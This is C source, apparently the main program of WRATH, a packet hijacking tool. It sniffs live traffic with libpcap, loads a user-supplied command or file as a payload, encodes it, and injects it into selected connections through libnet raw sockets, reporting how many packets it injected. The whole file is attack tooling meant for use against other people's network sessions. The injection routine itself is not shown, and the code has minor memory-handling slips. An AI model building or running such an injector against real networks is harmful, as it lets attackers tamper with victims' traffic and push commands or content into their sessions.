#include <stdlib.h>
#include <signal.h>
#include <libnet.h>
#include "wrath.h"

struct arg_values *user_values;
struct lcp_package *chp;
char *app_cmd_con;
FILE *fp;
int openned = 0;
libnet_t *libnet_handle;
pcap_t *pcap_handle;

void wrath_observe();

void wrath_terminate(int signal) {
	printf("\n");
	printf("Injection Statistics:\n");	

	struct libnet_stats l_stats;
	libnet_stats(libnet_handle, &l_stats);
	printf("Packets Injected: %d\n", l_stats.packets_sent);
	printf("WRATH terminating...\n");	

	if (openned)
		fclose(fp);

	exit(0);
}

int main(int argc, char *argv[]) {

	signal(SIGTERM, wrath_terminate);
	signal(SIGINT, wrath_terminate);

	user_values = (struct arg_values *) malloc(sizeof (struct arg_values));
	arg_eval(argc, argv, user_values);	

	wrath_observe(user_values);

	free(user_values);
}

void wrath_observe() {
	char libnet_errbuf[LIBNET_ERRBUF_SIZE];
	char pcap_errbuf[PCAP_ERRBUF_SIZE];
	char *device;

	/* initializing bundle */
	chp = (struct lcp_package *) malloc(sizeof (struct lcp_package));
	memset(chp, 0x00, sizeof(struct lcp_package));

	chp->cline_args = user_values;

	/* initializing sniffer, getting into position */
	pcap_handle = wrath_position(user_values); 

	/* grabbing device name for libnet */
		if (strcmp(user_values->interface, "\0") == 0) { // if interface is not set
			device = pcap_lookupdev(pcap_errbuf);
			if(device == NULL) {
				fprintf(stderr, "error fetching interface: %s %s\n", pcap_errbuf, "(this program must be run as root)");
				exit(1);
			}
		} else { // if interface is set
			device = user_values->interface;
		}

	// initializing environment for libent in advanced mode
	libnet_handle = libnet_init(LIBNET_RAW4_ADV, device, libnet_errbuf);
	if (libnet_handle == NULL) {
		fprintf(stderr, "trouble initiating libnet interface: %s \n", libnet_errbuf);
		exit(1);
	}
	chp->libnet_handle = libnet_handle;

	// finding payload
	int length;
	char *app_cmd = "\0";
	if (strcmp(user_values->input_file, "\0") != 0) { // If an input file has been specified
		int app_fd;
		app_fd = open(user_values->input_file, O_RDONLY, 0);
		if ((length = file_size(app_fd)) == -1)
			fatal_error("getting file size");
		app_cmd = (char *) safe_malloc(length);
		read(app_fd, app_cmd, length);
	} else if (!strcmp(user_values->command, "\0") != 0) { // If a command has been specified but not an input file
		length = strlen(user_values->command);
		app_cmd = (unsigned char *) safe_malloc(length);
		strcpy(app_cmd, user_values->command);
	}	

	// finding and setting up logfile
	FILE *fp;
	if ((strcmp(user_values->logfile, "\0"))) {
		fp = fopen(user_values->logfile, "w");
		openned = 1;
		chp->logfile = fp;
	}

	// converting and setting payload
	char *app_cmd_con = (char *) malloc(strlen(app_cmd));
	if (strcmp(app_cmd, "\0") != 0) { // if a payload was found
		wrath_char_encode(app_cmd, app_cmd_con);
		free(app_cmd);	
		chp->payload = app_cmd_con;
	} else {
		chp->payload = "\0";		
	}

	printf("Starting WRATH ...\n");
	printf("Hijacking selected packets with ... \n");
	printf("Payload:\n%s\n", chp->payload);
	if (openned) {
		fprintf(fp, "Starting WRATH ...\n");
		fprintf(fp, "Hijacking selected packets with ... \n");
		fprintf(fp, "Payload:\n %s\n", chp->payload);
	}
	
	// seeding psuedorandom number generator
	libnet_seed_prand(libnet_handle);


	int cap_amount = -1;
	if (user_values->count != 0) // if count is set
		cap_amount = user_values->count;

	pcap_loop(pcap_handle, cap_amount, wrath_inject, (u_char *) chp);
	pcap_close(pcap_handle);

	// getting statistical information
	struct libnet_stats l_stats;

	libnet_stats(libnet_handle, &l_stats);
	printf("Wrath Stats: \n");
	printf("Packets Injected: %d\n", l_stats.packets_sent);

	if (openned)
		fclose(fp);
	libnet_destroy(libnet_handle);
	free(app_cmd_con);
	free(chp);
}
